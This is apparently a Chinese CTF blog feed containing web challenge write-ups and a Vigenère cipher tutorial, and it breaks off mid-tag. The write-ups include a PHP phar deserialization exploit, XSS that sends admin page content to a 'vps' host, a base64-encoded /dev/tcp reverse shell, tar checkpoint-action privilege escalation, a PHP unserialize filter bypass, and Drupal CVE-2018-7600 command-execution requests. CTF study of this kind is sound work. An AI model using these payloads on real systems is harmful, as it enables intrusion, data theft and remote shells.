&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面构造攻击链的过程又学到了。。。。可以读一下这篇文章:<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p>攻击的流程tql….，给我就不会构造学到了。。。</p><p>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.触发Test类的<code>__get()</code><br>5.成功利用<code>file_get()</code>读文件</p><p>这里就直接引用Smile大佬的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    <span class="string">'source'</span> =&gt; <span class="string">'/var/www/html/f1ag.php'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($c); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">copy(<span class="string">'phar.phar'</span>,<span class="string">'exp.gif'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后根据文件名以及ip地址推出MD5的文件名，然后再用phar协议读取即可，这里记得改一下php.ini里面的属性phar.readonly = Off</p><p>图片名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=phar://upload/0b2d3fed2e75c3936721028b574d8228.jpg</span><br></pre></td></tr></table></figure><p>获得flag</p><p><img src="https://s1.ax1x.com/2018/12/21/FsREAf.png" alt="FsREAf.png"></p><h3 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h3><p>题目上来发现存在两个功能点，有一个admin.php还有一个check.php,但是admin.php只允许本地用户去读取，估计得用xss了。</p><p>可以从check.php里面的源码发现验证邮箱我们可以去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, please check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>构造源代码的脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>构造的绕过payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure><p>监听端口，发现</p><p><img src="https://s1.ax1x.com/2018/12/21/Fs4AMQ.png" alt="Fs4AMQ.png"></p><p>解码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>说明可以执行命令，然后重新修改脚本，反弹webshell，就在这一步的是时候，他喵的，他喵的，题目挂了我还是学习一下巨佬们的骚思路吧，这里学习了执念于心大佬的思路，通过写sh文件去反弹shell，用的是base64写shell,利用了管道符然后重定向到一个文件里面，echo后面的内容就是你写的反弹shell语句<code>/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1</code>经过base64之后的语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'L2Jpbi9iYXNoIC1pID4gL2Rldi90Y3AvaXAvcG9ydCAwPCYxIDI+JjE=' | base64 -d &gt; /tmp/xjb.sh</span><br></pre></td></tr></table></figure><p>然后执行<code>/bin/bash /tmp/**.sh</code>即可，这题的骚操作在于利用tar去提权，可以参考这篇文章，执行以下几句话,应该是先上传这几个名字的文件，利用了tar顺便把文件名给执行了，然后实现你的目的，你的目的内容写在demo.sh里面即可，你可以以对方身份webshell也行，直接读取flag也行，学到了，2333，以前对LInux的提权还是不太熟悉的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--checkpoint-action=exec=sh demo.sh</span><br><span class="line">--checkpoint=1</span><br><span class="line">demo.sh</span><br></pre></td></tr></table></figure><h2 id="小结一下漏洞点"><a href="#小结一下漏洞点" class="headerlink" title="小结一下漏洞点"></a>小结一下漏洞点</h2><ol><li>php位随机数爆破，得注意一下对应的版本是否正确才是用脚本去爆破，在有的时候还可以把随机数的格式换一下便于爆破</li><li>命令执行的绕过点，第一个是关于正则的m修饰符的小trick，用<code>%0a</code>去绕过，第二个就是就是对于整个单词如何进行切割绕过，可以用<code>\</code>以及单引号去绕过</li><li>NoSQL注入的过程，以及那个骚气的识别验证码的脚本，都是我薄弱的点，以后找个时间单独锻炼一下</li><li>python站的遇到secret_key就应该想到其中的一个思路就应该是构造session，还有python站的继承链的构造也是一个点，不太熟悉，也需要锻炼</li><li>看到file_exists这类的函数的时候应该有很好的意识去想到需要去用<code>phar</code>协议去测试一下，同样的里面的pop链构造也是自己薄弱的点，还得多加练习</li><li>这个邮箱注册绕过 FILTER_VALIDATE_EMAIL然后xss，攻击只有本地才能访问的local web应用，从而反弹shell，然后继续攻击内网web题目，使用tar提权查看flag，这思路很好，学到了。。。回去得看看Linux的提权骚操作了，只能说出题人真的tql…</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这个比赛Web真的很有质量，学到了很多东西
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒12月赛Web题解</title>
    <link href="0verwatch.top/anheng-12month.html"/>
    <id>0verwatch.top/anheng-12month.html</id>
    <published>2018-12-22T04:58:05.000Z</published>
    <updated>2018-12-22T05:01:32.092Z</updated>
    
    <content type="html"><![CDATA[<h3 id="吐槽一下"><a href="#吐槽一下" class="headerlink" title="吐槽一下"></a>吐槽一下</h3><p>这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了<a id="more"></a>。。。但还是记录一下。</p><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>这个题目考的是一个php反序列化的一个绕过，上来就给了一段代码，很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键是绕过这一句，本意是为了防止对象被反序列化，可以参考一下这篇文章:<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure><p>所以只需要只需要在对象长度前添加一个<code>+</code>号，即<code>o:14-&gt;o:+14</code>，这样就可以绕过正则匹配。最后的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="string">"baby"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>url编码后发包就可以获得flag:<code>flag{ad2328a2c3f0933c053fd3c6f28f6143}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/FySZ1H.png" alt="FySZ1H.png"></p><h3 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h3><p>这个题目上来发现没什么线索，只能扫一下目录，发现了一个<code>admin.php</code>，但是进去却回显<code>You are not admin...</code>，这样思路就很明确了，我们需要伪造admin的身份，查一下cookie，果然需要伪造一下，把cookie的值从<code>user</code>-&gt;<code>admin</code>就好，还需base64一下</p><p><img src="https://s1.ax1x.com/2018/12/22/FySHvd.png" alt="FySHvd.png"></p><p>然后就可以进入一个命令执行的页面,输入<code>ls</code>发现有回显，但是很多东西都被过滤了</p><p><img src="https://s1.ax1x.com/2018/12/22/FySObt.png" alt="FySObt.png"></p><p><img src="https://s1.ax1x.com/2018/12/22/Fyphss.png" alt="Fyphss.png"></p><p>可以尝试一下读文件，在<code>config.php</code>发现黑名单</p><p>admin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'admin'</span>])||$_SESSION[<span class="string">'admin'</span>]===<span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"You are not admin..."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'cmd'</span>]) &#123;</span><br><span class="line">$cmd = waf_exec($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">$retval = <span class="keyword">array</span>();</span><br><span class="line">exec($cmd, $retval, $status);</span><br><span class="line"><span class="comment">// var_dump($retval);</span></span><br><span class="line"><span class="keyword">if</span> ($status == <span class="number">0</span>) &#123;</span><br><span class="line">$res = implode(<span class="string">"\n"</span>,$retval);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">'error'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$res = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./templates/admin.html'</span>;</span><br></pre></td></tr></table></figure><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是如何绕过这个黑名单去读到flag，这里已经把很多东西都过滤了，但是<code>$</code>以及<code>/</code>都没被过滤，可以很好地执行命令</p><p><img src="https://s1.ax1x.com/2018/12/22/FypvLR.png" alt="FypvLR.png"></p><p>成功读取flag:<code>flag{6f1d95159e3b90ed28186c518dd15e8c}</code></p><p><img src="https://s1.ax1x.com/2018/12/22/Fypze1.png" alt="Fypze1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;吐槽一下&quot;&gt;&lt;a href=&quot;#吐槽一下&quot; class=&quot;headerlink&quot; title=&quot;吐槽一下&quot;&gt;&lt;/a&gt;吐槽一下&lt;/h3&gt;&lt;p&gt;这次的web题目感觉完全是新手题，思路很直接，我就不掺和了，做完web就逃23333，继续完成密码学课程实验报告去了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>维吉尼亚密码原理及Python实现</title>
    <link href="0verwatch.top/Virginia-python.html"/>
    <id>0verwatch.top/Virginia-python.html</id>
    <published>2018-12-21T08:17:06.000Z</published>
    <updated>2019-01-12T10:10:57.090Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单<a id="more"></a>形式。</p><h3 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h3><ol><li>加密过程:明文字母p对应的列和秘钥字母k对应的行的交叉点就是加密字母后的密文字母</li><li>解密过程:在密钥字母k对应的行找到对应密文字母，则该密文字母对应的列的字母就是明文字母</li></ol><p>下图就是维吉尼亚密码的表格，我们需要构造这样的一个表去查，代码是将其变成了一维的形式然后实现的</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UNH1.png" alt="F5UNH1.png"></p><h3 id="核心代码及分析"><a href="#核心代码及分析" class="headerlink" title="核心代码及分析"></a>核心代码及分析</h3><p>字母的偏移问题，我这里是分开大小写字母进行加解密的，也就是说大写加解密后还是大写，小写加解密后还是小写，然后从26个字母里面选择，所以必须注意边界问题，需要对26取余。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">letter_list = string.ascii_uppercase</span><br><span class="line">letter_list2 = string.ascii_lowercase</span><br></pre></td></tr></table></figure><p>代码只对字母进行加解密，代码里面需要注意的是一下细节问题，比如在密钥使用完过后需要循环使用，这里用的是取余加上一个标记flag去实现，然后从字母列表里面选取对应的字母即可。加解密代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> plain <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> plain.isalpha(): <span class="comment">#判断是否为英文</span></span><br><span class="line">            <span class="keyword">if</span> plain.isupper():</span><br><span class="line">                ciphertext += letter_list[(ord(plain) - <span class="number">65</span> + key_list[flag]) % <span class="number">26</span>] <span class="comment">#行偏移加上列偏移</span></span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> plain.islower():</span><br><span class="line">                ciphertext += letter_list2[(ord(plain) - <span class="number">97</span> + key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#不是英文不加密</span></span><br><span class="line">            ciphertext += plain</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(message,key)</span>:</span></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    key_list = key</span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> message:</span><br><span class="line">        <span class="keyword">if</span> flag % len(key_list) == <span class="number">0</span>:</span><br><span class="line">            flag  = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cipher.isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher.isupper():</span><br><span class="line">                plaintext += letter_list[(ord(cipher) - <span class="number">65</span> - key_list[flag]) %<span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> cipher.islower():</span><br><span class="line">                plaintext += letter_list2[(ord(cipher) - <span class="number">97</span> - key_list[flag]) % <span class="number">26</span>]</span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += cipher</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>这里以输入”helloworld”为例，然后进行加解密，能够正确完成</p><p><img src="https://s2.ax1x.com/2019/01/01/F5UGjJ.png" alt="F5UGjJ.png"></p><h3 id="详细代码-放在github上了-：维吉尼亚密码"><a href="#详细代码-放在github上了-：维吉尼亚密码" class="headerlink" title="详细代码(放在github上了)：维吉尼亚密码"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">维吉尼亚密码</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>CUMT第一轮双月赛Web题解</title>
    <link href="0verwatch.top/CUMT-month-race.html"/>
    <id>0verwatch.top/CUMT-month-race.html</id>
    <published>2018-12-16T12:05:32.000Z</published>
    <updated>2018-12-17T14:40:23.753Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez-upload"></a>ez-upload</h3><p>这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预<a id="more"></a>期了？</p><p><a href="https://imgchr.com/i/Fa0BnI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0BnI.png" alt="Fa0BnI.png"></a></p><p>菜刀链接获取flag</p><p><a href="https://imgchr.com/i/Fa0rHP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa0rHP.png" alt="Fa0rHP.png"></a></p><h3 id="Cve"><a href="#Cve" class="headerlink" title="Cve"></a>Cve</h3><p>参考了这篇文章：<code>https://www.menzel3.fun/2018/08/02/Drupal%20CVE2018-7600/#代码执行现场</code></p><p>这是一个Drupal 7的cve，照着构造payload就好，payload 分为两个请求。 先将 Payload 注入缓存中，构造下面的payload，发送一个POST包</p><p>POST请求：<code>/?q=user/password&amp;name[%23post_render][]=system&amp;name[%23type]=markup&amp;name[%23markup]=ls%20/</code></p><p>POST内容：<code>form_id=user_pass&amp;_triggering_element_name=name</code></p><p>获取form_build_id的value值：</p><p><a href="https://imgchr.com/i/FayX0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FayX0s.png" alt="FayX0s.png"></a></p><p>然后再POST发送执行的包：<code>/?q=file/ajax/name/%23value/form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>这里也需要form_build_id的值，POST的内容也是：<code>form_build_id=form-b7pP9HUKwcQBEuhZ1GZ79qWXV0KRb5YxUGoWaozSPRU</code>成功执行命令，这里注意一下参考文章里面的<code>passthru</code>命令用不了，只能改为<code>system</code>才能执行相关命令,所以上面缓存的时候换了用<code>system</code>函数</p><p><a href="https://imgchr.com/i/Fa6knJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa6knJ.png" alt="Fa6knJ.png"></a></p><p>再来一次<code>cat /flag</code>的操作就可以读取flag了</p><p><a href="https://imgchr.com/i/Fa66Nq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/Fa66Nq.png" alt="Fa66Nq.png"></a></p><h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><p>这个题是个代码审计的题目，先把源码给down下来</p><p>打开这个网站发现有登陆注册功能，以及购买flag的功能，但是这里面要想得到真正的flag却需要888积分才可以购买，这个时候就感觉应该是越权购买flag的漏洞了。。。。</p><p>发现源码里面有数据库文件打开看一下，发现是存在管理员的，并且id是16，这个东西后期有用，而且他有30000积分，够买很多flag了，还有商品id 38也可以得知</p><p><a href="https://imgchr.com/i/FaNVu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNVu6.md.png" alt="FaNVu6.md.png"></a></p><p><a href="https://imgchr.com/i/FaNeHO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNeHO.png" alt="FaNeHO.png"></a></p><p>看到代码里面的setting文件，有从secret.key读出来的秘钥</p><p><a href="https://imgchr.com/i/FaNuUe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNuUe.md.png" alt="FaNuUe.md.png"></a></p><p>看一下里面的秘钥，一定要注意这里还有个回车啊啊啊啊，后边伪造签名有用</p><p><a href="https://imgchr.com/i/FaN1gI" target="_blank" 